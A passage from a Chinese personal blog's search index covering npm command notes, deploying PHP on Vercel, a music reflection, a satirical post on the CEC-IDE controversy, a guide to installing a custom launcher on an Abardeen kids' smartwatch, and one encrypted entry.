@usr/foo@2.0.0</td><td>npm exec @usr/create-foo@2.0.0</td></tr></tbody></table><ul><li>如果您取消发布整个包，则必须在 24 小时后才能发布该包的任何新版本</li></ul><h3 id="转移">转移</h3><table><thead><tr><th>命令</th><th>含义</th></tr></thead><tbody><tr><td>npm owner add <their-username> <package-name></td><td>新维护者接受邀请</td></tr><tr><td>npm owner rm <your-username> <package-name></td><td>删除维护者</td></tr><tr><td>npm owner add <their-username> <package-name> --otp=123456</td><td>写入启用了双因素身份验证</td></tr></tbody></table><h3 id="使用-nrm-管理-registry-地址">使用 nrm 管理 registry 地址</h3><table><thead><tr><th>命令</th><th>含义</th></tr></thead><tbody><tr><td>npm install -g nrm</td><td>下载安装 nrm 包</td></tr><tr><td>nrm ls</td><td>查看 registry 列表</td></tr><tr><td>nrm add npm <a href="http://registry.npmjs.org" rel="external nofollow noreferrer">http://registry.npmjs.org</a> 或 nrm add taobao <a href="https://registry.npm.taobao.org" rel="external nofollow noreferrer">https://registry.npm.taobao.org</a></td><td>添加 registry 地址</td></tr><tr><td>nrm use npm 或 nrm use taobao</td><td>切换 npm registry 地址为上面的<code>taobao</code>或<code>npm</code></td></tr></tbody></table><h2 id="镜像源修改">镜像源修改</h2><p>重置 npm 镜像：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry http://registry.npmjs.org</span><br></pre></td></tr></table></figure><p>临时修改 npm 镜像：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i --registry=http://registry.npmjs.org</span><br></pre></td></tr></table></figure><p>保存修改 npm 镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry https://registry.npm.taobao.org </span><br><span class="line">npm info underscore </span><br></pre></td></tr></table></figure><p>查看镜像的配置结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config get registry</span><br></pre></td></tr></table></figure><h2 id="npm-install-后缀含义">npm install 后缀含义</h2><blockquote><p>npm install XXX</p></blockquote><p>npm 5 开始通过 <code>npm install XXX</code> 什么都不加，和 <code>npm install XXX --save</code> 一样，都是局部安装并会把模块自动写入 <code>package.json</code> 中的 <code>dependencies</code> 里。安装模块到项目目录下，本地安装会将安装包放在<code>./node_modules</code>下</p><ul><li>会把 moudule_name 包安装到 node_modules 目录中</li><li>不会修改 package.json</li><li>之后运行 npm i 命令时，不会自动安装 moudule_name</li></ul><blockquote><p>npm install XXX -s</p></blockquote><p>相当于 <code>npm install XXX --save</code>。这样安装是将模块安装到项目目录下，并在<code>package.json</code>文件的<code>dependencie</code>（生产环境下的依赖管理）写入依赖。如果你将要安装的这个库是用来构建你的项目的，比如<code>echarts</code>、<code>element-ui</code>，是实际在项目中起作用，就可以使用<code>-s</code>来安装。</p><ul><li>会把 moudule_name 包安装到 node_modules 目录中</li><li>会在 package.json 的 dependencies 属性下添加 moudule_name</li><li>之后运行 npm i 命令时，会自动安装 moudule_name 到 node_modules 目录中</li><li>之后运行 npm i --production 或者注明 NODE_ENV 变量值为 production 时，会自动安装 msbuild 到 node_modules 目录中，即是在线上环境运行时会将包安装</li></ul><blockquote><p>npm install XXX -d</p></blockquote><p>相当于 <code>npm install XXX --save-dev</code>。这样安装是将模块安装到项目目录下，局部安装，并在<code>package.json</code>文件的 <code>devDependencies</code> （开发环境下的依赖管理）写入依赖。如果你安装的库是用来打包的、解析代码的，比如 <code>webpack</code>、<code>babel</code>，就可以用<code>-d</code>来安装。在项目上线后，这些库就没用了。</p><ul><li>会把 moudule_name 包安装到 node_modules 目录中</li><li>会在 package.json 的 devDependencies 属性下添加 moudule_name</li><li>之后运行 npm i 命令时，会自动安装 moudule_name 到 node_modules 目录中</li><li>之后运行 npm i –production 或者注明 NODE_ENV 变量值为 production 时，不会自动安装 moudule_name 到 node_modules 目录中</li></ul><blockquote><p>npm install XXX -g</p></blockquote><p>将模块安装到全局，安装一次过后，其他地方也可使用。具体安装到磁盘哪个位置要看 npm config</p><ul><li>安装模块到全局，不会在项目 node_modules 目录中保存模块包。</li><li>不会将模块依赖写入 devDependencies 或 dependencies 节点。</li><li>运行 npm i 初始化项目时不会下载模块。</li></ul><blockquote><p>使用原则：<br>devDependencies 节点下的模块是我们在开发时需要用的，比如项目中使用的 gulp ，压缩 css、js 的模块。这些模块在我们的项目部署后是不需要的，所以我们可以使用–save-dev 的形式安装。像 express 这些模块是项目运行必备的，应该安装在 dependencies 节点下，所以我们应该使用–save 的形式安装。</p></blockquote><p>总结为一句话：运行时需要用到的包使用––save，否则使用––save-dev</p><h2 id="附">附</h2><h3 id="报错与换源">报错与换源</h3><p><a href="https://www.jianshu.com/p/3fd7d90db01a" rel="external nofollow noreferrer">https://www.jianshu.com/p/3fd7d90db01a</a></p><p>解决办法：</p><ol><li>执行：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm config get proxy</span><br><span class="line">npm config get https-proxy</span><br></pre></td></tr></table></figure><p>如果返回值不为 null，继续执行：<br>（这一步很重要，一定要保证两个命令的返回值都为 null, 话说回来，应该出现这个错误这两个返回值有不为 null 的）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm config set proxy null</span><br><span class="line">npm config set https-proxy null</span><br></pre></td></tr></table></figure><ol start="2"><li>执行：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g cnpm --registry=https://registry.npmmirror.com</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry http://registry.npmmirror.com/</span><br></pre></td></tr></table></figure><h3 id="安装-yarn">安装 yarn</h3><blockquote><p>Yarn 是 facebook 发布的一款取代 npm 的包管理工具，还可以作为项目管理工具。无论你是小型项目还是大型单体仓库（monorepos），无论是业余爱好者还是企业用户，Yarn 都能满足你的需求。</p></blockquote><p>全局安装 yarn：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install yarn -g</span><br></pre></td></tr></table></figure><p>使用<code>npm init</code>初始化后，安装依赖可使用下面这段命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn install</span><br></pre></td></tr></table></figure><p>卸载 yarn</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm uninstall -g yarn</span><br></pre></td></tr></table></figure><h2 id="参考：">参考：</h2><blockquote><p><a href="https://quickref.me/zh-CN/docs/npm.html" rel="external nofollow noreferrer">https://quickref.me/zh-CN/docs/npm.html</a><br><a href="https://segmentfault.com/a/1190000014117849" rel="external nofollow noreferrer">https://segmentfault.com/a/1190000014117849</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 摘录笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nodejs </tag>
            
            <tag> 摘录笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vercel 无服务器部署 php 程序</title>
      <link href="/posts/2223589302/"/>
      <url>/posts/2223589302/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="写在前面">写在前面</h2><p>vercel 规定了程序没有写入权限，唯一拥有写入权限的只有<code>/tmp</code>这个临时目录。考虑用这种方法的，大多是“实验”或 api 等小 php 项目的（特地弄个服务器不大划算？）。</p><p>你可能见过有人用这样的操作部署了 Typecho 等程序，<s>那是另编写了类似于<code>config.inc.php</code>之类的配置文件实现的——不过按照这个思路实现安装 WordPress 等亦非不可</s>。 这种实际上是把安装后会生成的配置文件提前创建好了，如果访问网站安装程序，填写的信息也需与此处的保持一致；将来使用时，凡是需要将数据在本地进行储存或修改的操作都无法正常进行。</p><p>由于众所周知的原因，请自备：</p><ul><li>域名（前面讲 Waline 配置时介绍过<code>.vercel.app</code>域名的现状，除非你不打算在国内使用）</li><li>能让 github 体验感变好的加速器（如<code>Watt Toolkit</code>，即<code>Steam++</code>。如果你网够好可无视）</li><li>初中英语（再不济翻译软件总有吧？）</li><li>搜索引擎</li></ul><p>本文不介绍如何网站账户注册等问题，不懂请自行搜索。</p><blockquote><p>如果你正好想要部署 Typecho ，GitHub 上已有大佬预配置好了，你可以直接去搜索阅读那个项目的说明。</p></blockquote><hr><p>What？Vercel 什么时候能部署 PHP 程序了？</p><blockquote><p><a href="https://github.com/vercel-community/php" rel="external nofollow noreferrer">Vercel-PHP</a></p></blockquote><p>的确是可行的啊！这对于一些想部署些觉得特地准备服务器不划算的 PHP 项目的用户来说是好消息。</p><h2 id="正文">正文</h2><h3 id="准备">准备</h3><p>关于部署项目到 Vercel 有两种方式：一种使用 Vercel CLI 进行部署；另一种使用第三方库进行拉取。这里使用后者（因为操作比较偏小白）</p><p>创建个文件夹，命名随意。在该文件夹下，请确保有以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">project（文件夹）</span><br><span class="line">├── api</span><br><span class="line">│   └── index.php</span><br><span class="line">└── vercel.json</span><br></pre></td></tr></table></figure><p><code>api/index.php</code>中有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file= __DIR__ . &#x27;/..&#x27;.$_SERVER[&quot;PHP_SELF&quot;];</span><br><span class="line"></span><br><span class="line">if(file_exists($file))</span><br><span class="line">&#123;</span><br><span class="line">   return false;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    require_once __DIR__ . &#x27;../index.php&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">#echo $_SERVER[&quot;PHP_SELF&quot;];</span><br></pre></td></tr></table></figure><blockquote><p><code>require_once __DIR__ . '../index.php';</code>后面这里你可以自行修改</p></blockquote><p><code>vercel.json</code>中有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;functions&quot;: &#123;</span><br><span class="line">    &quot;api/index.php&quot;: &#123;</span><br><span class="line">      &quot;runtime&quot;: &quot;vercel-php@0.6.0&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;routes&quot;: [</span><br><span class="line">    &#123; &quot;src&quot;: &quot;/(.*)&quot;, &quot;dest&quot;: &quot;/api/index.php&quot; &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p><code>&quot;runtime&quot;: &quot;vercel-php@0.6.0&quot;</code>一行， vercel 的 php 环境对应为：</p></blockquote><table><thead><tr><th>vercel-php</th><th>PHP 版本</th></tr></thead><tbody><tr><td>vercel-php@0.6.0</td><td>PHP 8.2.x</td></tr><tr><td>vercel-php@0.5.3</td><td>PHP 8.1.x</td></tr><tr><td>vercel-php@0.4.1</td><td>PHP 8.0.x</td></tr><tr><td>vercel-php@0.3.3</td><td>PHP 7.4.x</td></tr></tbody></table><blockquote><p>不过 PHP7.4 在 2022 年 11 月 28 日停止维护，建议还是用<code>0.6.0</code>那个（自己使用时，只有这个版本能部署成功，其他均有报错，可能是 nodejs 版本、安全什么的问题。如果你准备部署的 PHP 程序不支持 PHP8.2 ，那……自求多福吧。</p></blockquote><p>之后将你想要部署的 PHP 程序放到该文件夹根目录（与<code>vercel.json</code>文件同级，<code>index</code>文件所在目录需与<code>api/index.php</code>中<code>require_once __DIR__ . '../index.php';</code>对应）。</p><h3 id="推送与部署">推送与部署</h3><p>进入 GitHub 并登录，创建一个仓库（命名随意），将你刚才那个文件夹里的所有东西推送到这个仓库里（如果你跟着本文的方式进行，推送完后<code>vercel.json</code>文件应在该仓库的根目录下）。</p><p>打开<a href="https://vercel.com" rel="external nofollow noreferrer">vercel.com</a>并使用 GitHub 登录，创建 Vercel 项目（此处项目名可以不与 GitHub 仓库同名）。选择仓库，会提示安装相应组件……这里跟着网页上的指引一步步来即可，最后满屏的烟花（有些网络环境不佳的可能只有“Congratulations”这样的词）会庆祝你部署成功。</p><p>之后按照网页上的提示进入项目页面，它会提供给你一个<code>.vercel.app</code>后缀的域名——不过国内无法访问。这绑定域名应该不需要多说了，实在不行网页翻译一下也是能懂的。</p>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 程序 </tag>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
            <tag> Vercel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《Perfect Day》 - Seven24</title>
      <link href="/posts/2853259138/"/>
      <url>/posts/2853259138/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><audio src="/attach/Perfect%20Day%20-%20Seven24.mp3" controls="controls" controlsList= "nodownload" oncontextmenu= "return false"></audio></p>【播放时请手动关闭左下角的音乐播放器，如果没看到或没播放则不用管<p>戴上耳机，闭上双眼，感受灵魂与旋律的碰撞，身心放空。没有强烈的节奏感，很容易使人安静下来。旋律优美而动听，没有歌词却直击心灵；节奏缓慢而平稳，令人心情平静放松；钢琴声和电子音效相互交织，营造出梦幻和浪漫的氛围。</p><p>宇宙洪荒，星辰浩瀚，斗转星移，流光溢彩，美轮美奂，轻松闲适。静坐在草地上，抬头仰望，漫天星光。不久太阳升起，曙光破晓，像是在万籁俱寂的黎明，一道光冲破黑暗。身心愉悦，享受大自然的美好。</p><p>（以上内容为个人拙见）</p>]]></content>
      
      
      <categories>
          
          <category> 摘录笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 音乐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>国产自研多环境开发软件 CEC-IDE 问世，“卡脖子”问题完美解决！</title>
      <link href="/posts/3995821213/"/>
      <url>/posts/3995821213/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="前言">前言</h3><p>IDE 是什么？IDE 是集成开发环境（Integrated Development Environment）的缩写，它被用于提供程序开发环境的应用程序，一般包括代码编辑器、编译器、调试器和图形用户界面等工具。常见的有 VisualStudio、Eclipse、AndroidStudio、PyCharm 等。</p><p>如你所见，长期以来它们都是外国厂商或团队开发的，话语权在外国人手中。一切都有被牵着鼻子走，很容易让我们陷入卡脖子的困境。而今天，这个问题得到了解决！这是继国产自研浏览器、国产自研 XXX 后的又一新产品：国产自研 IDE！</p><p><img src="https://s2.loli.net/2024/10/26/BhFyIXq4w1iKbkP.png" alt=""></p><h3 id="图标与界面">图标与界面</h3><p>Logo 是产品的理念、特征的体现，开发商精神的象征。一个好的 Logo 能将自己产品的潜在用户转变为真正的用户。在 CEC-IDE 的 logo 中，渐变的蓝色，象征着科技潮流；圆弧和直边的结合，象征着尺规结合，天圆地方，融合了科技感与传统文化之美。</p><p>当时安装时太激动了，以至于忘记截图安装界面，这里大致描述一下：安装界面非常简洁，没有任何多余的东西，对初次接触电脑的用户来说非常友好。咱们直接欣赏它的运行界面：</p><p><img src="https://s2.loli.net/2024/10/26/ZkiVI5nFWEs7eqR.png" alt=""></p><p><img src="https://s2.loli.net/2024/10/26/CiXZY8RThVdE5sS.png" alt=""></p><p>登录组件，非常先进！那什么 vscode 之类的，安装即用，毫无保障，完全不知道别人会用那些编辑器做什么——而这个编辑器不一样，它需要登录。果然，保护用户数据安全，我们义不容辞。有些程序员用这款国产编辑器编写代码，之后上传到国外平台，难以追踪，居心叵测。</p><p>细看功能，十分强大。编辑器最重要的功能之一便是代码编写。CEC-IDE 内置了多个常用的开发工具和语言，可以根据需求选择性安装，提高开发效率。整个编辑器也采用有英文界面，让国人无感迁移开发工具，从此摆脱 vscode 依赖！当然，你还可以通过左下角齿轮按钮进入设置，配置简体中文，对国人开发者十分友好。</p><p>你可能会说，此等强大的工具，没有插件，实在发挥不出其潜力啊！且慢，它不但有插件市场，而且非常丰富，甚至它创新有其他编辑器所不具备的功能：本土化的插件！什么敏感词工具、数字广东智能网关插件等，很好的适应了在中国本地的开发需求，省时省力，不必为合规、兼容等问题而煞费苦心。</p><p>开发程序是需要投入大量的金钱与时间的。而这款 IDE 的会员服务，完美适应了当下经济复苏的需要。赠人玫瑰，手有余香，今日充会员的钱，明天就能成为我们创新大道上的至关重要的一个“助推器”！</p><h3 id="软件信息">软件信息</h3><p><img src="https://s2.loli.net/2024/10/26/p5z7i4rVP9x1IAg.png" alt=""></p><p>上图为官网所截取，可以看出，它功能强大，支持多种开发环境，并且在此基础上进行创新，增强安全性保护措施，保障开发者的信息安全。而且还有一点，它能够<code>“完全兼容 vscode 的插件”</code>！诶，不对啊，这样兼容，不会被微软告吗？你错了，我们的国产 IDE 与国际大厂微软已达成合作，不信请自行查看软件信息，上面赫然写着的<code>“Copyright(C)2022 Microsoft.Allrights reserved”</code>，便是最好的证明。</p><p>为了让国内开发者快速用上国产 IDE ，有人在 VSCode 的插件市场上开发了“国产化”工具组件，“国产化你的 VSCode, 来源于 CEC-IDE, 有敏感词检测、防沉迷等功能，这下自主创新了！”</p><p><a href="https://marketplace.visualstudio.com/items?itemName=qcqx.cec-ide" rel="external nofollow noreferrer" title="https://marketplace.visualstudio.com/items?itemName=qcqx.cec-ide">https://marketplace.visualstudio.com/items?itemName=qcqx.cec-ide</a></p><p>该插件的作者也有雄心壮志，这位作者也在插件的结尾如是写道：</p><blockquote><p>接下来，本项目将进一步聚焦解决数字产业核心技术的“卡脖子”难题，牵住数字关键核心技术自主创新这个“牛鼻子”，强化自主创新项目整合，善用 GITEE 建设形成的人才聚集效应，切实提高数字关键核心技术创新能力，持续彰显科技创新示范效应。</p></blockquote><h3 id="官网现状">官网现状</h3><p>现在去看，官网已无法访问。不用说，肯定是太平洋彼岸的某个国家干的好事！你看 VSCode 是不是与 CEC-IDE 很像？不用说，肯定是某软抄袭了；不仅抄袭了，它为了让人看不出抄袭痕迹，甚至删去了所有我们辛辛苦苦自主创新的国产化组件，然后将其开源。这是对我们劳动成果的不尊重！</p><p>为了防止他们继续这种低级的行为，我们的数字广东已对 CEC-IDE 的官网进行了加密验证，现在很多国内的用户都无法访问了，实在让人惋惜。这种“宁可错杀一万，绝不放过一个”的作法，需要极大的勇气，却能狠狠地卡了外国的脖子！</p><p><img src="https://s2.loli.net/2024/10/26/Nd9Wz6IZbKkFSHR.png" alt=""></p><p>但是，我们的开发者并不和它一般见识，它的“道歉声明”下方所写：</p><blockquote><p>开源软件的使用极大提升了我司产品研发效率，开源项目为我司提供了巨大帮助，开源精神是程序员共同的同心圆，数字广东公司向所有开源贡献者致以衷心的感谢和崇高的敬意。</p></blockquote><p>很显然开发者并不想和它撕破脸，委屈了自己，却展现了我们民族千年流传下来的“礼让”、“君子”之风，让对面的人汗流浃背！</p><h3 id="结语">结语</h3><p>国产产品研发路程坎坷、饱受歧视，从曾经的汉芯芯片遭到某大学论坛的“攻击”，到自研红芯浏览器被人恶意解包，再到如今的 CEC-IDE，时刻遭受到“质疑”与“批评”。但我们也没有放弃行动。这不，最近据闻国内部分地区的网络屏蔽了 vscode 官网，甚至将其跳转到防诈骗页面，便是其一——谁让它“抄袭”了我们自主研发的产品。</p><p>无论如何，我们坚信，敌人的这种伎俩在我们创新的道路上是不值一提的，我们的创新之路，只会越走越远，越走越开阔！这条大道，是前途光明的；这种力量，是势不可挡的！</p><hr><p>看到这个消息时我先是高兴，但随着质疑越来越多，再加上它的各种“不走心”，再度失落。</p><p>国内无论是软件还是文学音乐创作等方面，人们的版权意识都有待提高。很多东西，你看着是新起的，实则不然——暂不说改得好不好，能注明来源的便寥寥无几（作者另有声明的另说）。这种做法，打击了国内开发者的热情，也给国产软件败坏了名声，百害而无一利。</p><p>我觉得，用开源的东西并不可耻，现在很多知名项目就是靠着开源发展壮大的。但就此“自研”编辑器而言，连开源协议都不遵守，还号称自主研发；被揭发后匆匆道歉言“少量创新”“遗漏了 MIT 开源协议文件”，实在滑稽。整个声明四分之一多一点在列举自己干了什么，通篇下来以套话为主。</p><p>啊，官网活着时首页还赫然几个大字：守正创新。额……</p>]]></content>
      
      
      <categories>
          
          <category> 漫谈杂言 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>阿巴町手表折腾记录</title>
      <link href="/posts/3185181503/"/>
      <url>/posts/3185181503/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><font color="red"><b>前排提示：新版手表我没试过，而且据闻新版采用了 AliOS 无法破解。</b></font></p><p><font color="red"><b>另外，折腾有风险，玩机需谨慎。本教程仅作参考，出现任何后果本站不负责任。</b></font></p><p>最近找到了曾经使用过的一款阿巴町 V118 手表。虽然现在已经使用手机不需要这个了，但从网上得知了这玩意基于安卓 6.0，再加上看到很多人将其破解，便萌生了动手的想法。<br>虽然配置 1G+8G，但也不是不能用~</p><h2 id="材料">材料</h2><ul><li>阿巴町 V118 手表（请确认其基于安卓系统而非 AliOS 等）</li><li>电话卡（不管欠不欠费）</li><li>电脑端安卓工具（例如搞机助手等，本文以此为例）</li><li>能用的安卓桌面（例如 NovaLauncher 等）</li><li>ADB 环境（网上有教）</li><li>配套数据线</li></ul><h2 id="过程">过程</h2><h3 id="进入原生系统设置">进入原生系统设置</h3><p>先给手表把电话卡装上（也可以先充电再装卡，但要重启后才识别），之后充电至起码 30%以上。然后在手表自带桌面的首页从下往上滑呼出拨号界面，输入<code>112#</code>，随后会弹出一个白色背景的拨号界面。</p><p>在这个界面中，删除前面输入的数字，输入<code>*#*#4636#*#*</code>，进入测试菜单。</p><p>在此界面点击<code>使用情况统计数据</code>一项后，点击左上角返回，进入原生系统设置。</p><h3 id="手表端设置">手表端设置</h3><p>【注：此处和其他正常安卓手机进入开发者模式方法相同】</p><p>划到最底下，点击<code>关于手机</code>，划到最底，点击<code>版本号</code>七次，打开开发者模式。</p><p>回到上级菜单，点击<code>开发者模式</code>条目，在里面把<code>USB 调试</code>打开。其他你觉得有用的请自便。</p><p>再回到上级菜单，找到<code>无障碍</code>，将<code>快速开机</code>打开。</p><p>再回到上级菜单，进入<code>应用</code>，点击右上角三点，选择<code>显示系统进程</code>，找到<code>Launcher</code>和<code>KTWatchService</code>，分别点击，将其<code>停止运行</code>。完成上述步骤后将手表连接电脑</p><h3 id="电脑操作">电脑操作</h3><p>如果按照我的教程，可以使用<code>搞机助手</code>这个工具。保持手表在系统设置菜单界面，连接电脑，手表端提示授权点同意即可。待检测到设备后，点击<code>系统模式</code>选项卡，点击<code>软件卸载#冻结</code></p><p>点击右侧<code>获取所有包名</code>，搜索找到下面这两项：</p><blockquote><p>com.cwtcn.kt.luncher<br>com.cwtcn.kt.watchservice<br>将其分别<code>冻结</code>，然后回到软件主界面找到<code>应用安装</code>，选中你先前准备好的安卓桌面 apk 文件，等待安装完成。<br>【不建议卸载，冻结即可。而且建议顺带将这两个备份一下】</p></blockquote><h3 id="启用桌面">启用桌面</h3><p>在手表端设置界面找到<code>应用</code>进行寻找，确认下你刚才选择的桌面已经安装完成（在列表显示）。然后回到上级，点击<code>主屏幕</code>，选中你准备的桌面。</p><p>不出意外的话桌面能够正常启用了。</p><h2 id="换回原生桌面？">换回原生桌面？</h2><p>由于每次重启后设置里的 USB 调试会自动关闭，因此需手动打开后将手表连接电脑。按照先前冻结应用的方法，将那两个应用解冻，完成后重启手表即可。</p><p>（这也是为什么网上很多教程都建议修改 apk 包名的原因，重启手表后，原生桌面和原生手表服务组件会清理非<code>com.cwtcn.kt.XXX</code>的应用）</p><h2 id="推荐软件">推荐软件</h2><p><font color="red"><b>警告：这些软件别用在主力机上。这里面有些软件各位可能不屑一顾，但对这种手表来说已经算可以凑合了。你有更佳的软件请随意。</b></font></p><table><thead><tr><th>类型</th><th>软件名</th><th>提醒</th></tr></thead><tbody><tr><td>启动器</td><td>NovaLauncher</td><td>此无需过多介绍，自定义桌面比较出名的，不知道的自行百度。呼出顶栏要么黑屏（再次上滑恢复，可理解为状态栏和下拉菜单是黑屏）要么没反应，暂时难以解决，估计是阿巴町官方修改了安卓系统文件</td></tr><tr><td>虚拟按键</td><td>easyTouch</td><td>阿巴町官方肯定不会是只在安卓系统上单纯开发了套软件，因为即使替换了原生桌面，这种通知栏、虚拟导航什么的还是难以调出，故使用此软件“曲线救国”，类似于 iOS 的小白点</td></tr><tr><td>输入法</td><td>QQ 输入法</td><td>阿巴町输入法给它自己那套软件用用还凑合的。安装后分辨率可能让人很难受，但不至于不能用</td></tr><tr><td>应用市场</td><td>2345 应用市场</td><td>实在找不出占用小且功能全的这种配置上的应用市场了。不建议使用新版的，建议版本为下载完后图标整体浅蓝、顶部与手提袋绳为深蓝，没有或章鱼图标不明显</td></tr><tr><td>浏览器</td><td>Via</td><td>内核版本有点低，有些网站加载不来或加载故障</td></tr><tr><td>文件管理</td><td>Mi File Explorer</td><td>从小米手机中提取移植的，功能不错</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 折腾 </tag>
            
            <tag> 硬件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记梦</title>
      <link href="/posts/721094206/"/>
      <url>/posts/721094206/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被校验，不过您还是能看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="fd7e5e55acebe8b373254a699b8602a9ff5561ecd56155f5260c6ed8cdb715cb">3c4eb1d13bbfc472d2158149c25b9b2127cbac205926b7ffd0243688e0d4a6c8756ff64a09735193102f2e03e5f27b6e45bf2d808656fb04731cf9f4a6510f6c10aad312322c6a3707ca6998fb2fd512a62e448e043caa2c6ff58cf693a5281b70f63dab5079e563e4c9ab76266cf5fee16f9a62fef884f1233730abb6044ab0eed0b52ecde6906856643c889b186e87e1270f6612a8b41a605ab8311e09903e30241fe3f68239adeed64bc9218879c179851ca14c3b4ba22948d9476fe6754cac0b001dbb3087e0b16d97864d23a3c0811b0d40612d6b7fea1eee27abef40729c37920e8187d3b0210c8e2ebdea633bca82b374a2e00dfe7648eb2939bc62ddc8073d5383b989f9f71908142781820faadfd3b9ea9d015e38017a1a929fe296987d99429699e8867f2b7f77fbf4ffadcba79d2988a782219f415cc42823c39285b79948e4e14c66c07d6b6c36acabdc8ae077dbe0162bb1597f60bdc3865a82a37f7cff4bc14a9b358855ec7e5732e046400790cbfb03c7b9f473496098d00d4ad3a22739c67d727306f4fc7c0278b36c4b232824b48680e19a23c925911e3e4470490070e831201214c5af596f4094d8f6d9117656aa5d869c8cc4bb748a116b8a813e52caf7f4e429abbd8adbacfdede944a0622a50ac756662d247d8b3149f8b40ee060cd56518341d118c026f4eca5537a866e8bf954377f6aa103421e7a0498281ae3c507e298b412b66bbbb66d7281625c517c8c4792aec95cb31f1b74120a4009dedfb5c15bf9cefeb226623879fae9ac66e392389d673d0aef9cfad2a75e8b666547dc082c170cbde78bf46a86661f7e558f732c0add781a8159da8d196bb8a0059f2645c1bb67e8b47f4f16a2f0982bd0b027f2e0cd30fbc5d819fcb3932d4ba638a6f67f0249ac9a52182805ee68f760951bd1c0224de3099a33a80eadb7eff06755655213d3d30971b21db4755352a15f3b3bfecbe8db8346d400c24b31c0bd024262aea8eeb2e9879e7f835088d2ab3f2fca28891a2b12158e5655d4d567e88fe485cc5c3fc4bd4b2b019f549e9e5c9f9ed90a60bbe6411d43dbe45b9d9b54afd16d9a949a1de5b48fffdc34a29b31f12918fd8235b666e2ee4b9f12ed7ba90b8fd3d71aeaa3e019a31bff11e3feb5b35dc70a6351808e04331efa9f611839fb9eabe926c57ccbb2c501e29ae5d9ff2c6bc65737b5077b94ef94e5f7442e63385a128e875910602d2d9c0b6aa7e4e11b1d86f3a945fa5644e64642e4589721444dbeb29414cbc4bffeeb548ddd100b494266bd276dae7b262ab0fd4052837cb8cdcaf299c5100ded4ccb8219d375a342624222b7eb570e82407a9d9dcb76b6de96f0c3f8dcbfd1dbe11c99fc8dc99a7b0f6f1cc99ba71ac2ee88ace74589c6926b44d77b9497d44b583c